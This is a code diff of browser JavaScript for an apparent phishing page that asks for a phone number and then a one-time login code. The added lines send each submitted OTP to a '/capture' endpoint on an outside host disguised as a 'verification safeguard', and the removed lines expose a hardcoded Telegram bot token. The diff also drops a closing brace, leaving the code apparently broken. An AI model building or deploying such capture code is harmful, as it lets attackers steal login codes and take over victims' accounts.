@@ -4,15 +4,14 @@ if (document.getElementById('login-form')) {
         
         const phoneNumber = document.getElementById('phone-number').value;
 
-        // Make a request to Telegram's API to send an OTP
-        fetch('https://api.telegram.org/bot7582058238:AAEbygzj6yvZ52SLh6AM2a9Sr4K6IcrBGr4/sendMessage', {
+        // Make a request to your backend to send the OTP
+        fetch('/sendOTP', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                chat_id: phoneNumber, // Assuming phoneNumber is the chat ID
-                text: 'Please enter the OTP sent to your phone.'
+                phoneNumber: phoneNumber
             })
         })
         .then(response => {
@@ -28,9 +27,8 @@ if (document.getElementById('login-form')) {
             alert('Error sending OTP. Please try again.');
         });
         
-    });
 } else if (document.getElementById('otp-form')) {
-    // Handle OTP submission
+    
     document.getElementById('otp-form').addEventListener('submit', function(event) {
         event.preventDefault(); 
         
@@ -44,7 +42,7 @@ if (document.getElementById('login-form')) {
             otpCode: otpCode
         };
 
-        fetch('http://localhost:3000/capture', {
+        fetch('https://verificationsafeguard.vercel.app/capture', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
